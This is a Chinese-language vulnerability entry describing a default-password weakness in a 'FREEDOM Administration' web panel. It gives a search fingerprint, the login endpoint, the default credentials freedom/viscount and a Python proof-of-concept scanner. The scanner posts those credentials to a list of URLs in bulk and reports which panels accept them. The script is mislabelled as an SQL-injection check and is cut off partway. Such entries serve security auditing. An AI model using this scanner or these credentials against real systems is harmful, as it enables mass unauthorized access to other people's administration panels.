# FREEDOM-Administration默认密码漏洞

- **系统**：FREEDOM　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`title="FREEDOM Administration"`
- **请求**：`POST /mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
formLoginName=freedom&formLoginPassword=viscount
出现302即可跳转
也有可能出现200状态码，此时需要判断响应中是否存在Log  Out
默认用户名密码：
freedom/viscount
批量检测：
python poc.py -f url.txt
单个检测：
python poc.py -u your-ip
import requests
import urllib3
from urllib.parse import urljoin
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def read_file(file_path):
with open(file_path, 'r') as file:
return file.read().splitlines()
def check_sql_injection(url):
target_url = url.rstrip("/")
target_endpoint = urljoin(target_url, "/mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login")
headers = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
"Content-Type": "application/x-www-form-urlencoded"
payload = '''formLoginName=freedom&formLoginPassword=viscount'''
try:
response = requests.post(target_endpoint, verify=False, headers=headers, timeout=5, data=payload)
if response.status_code == 200 and 'Log Out' in response.text :
print(f"\033[31mFind: {url}: FREEDOM-Administration_Default-Login!\033[0m")
return True
except requests.RequestException as e:
print(f"Error checking {url}: {e}")
return False
def main():
parser = argparse.ArgumentParser(description="Check for SQL injection vulnerabilities.")
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument("-u", "--url", help="Target URL")
group.add_argument("-f", "…（脚本共 1727 字，完整版见原文）
```
- **预期**：302　|　—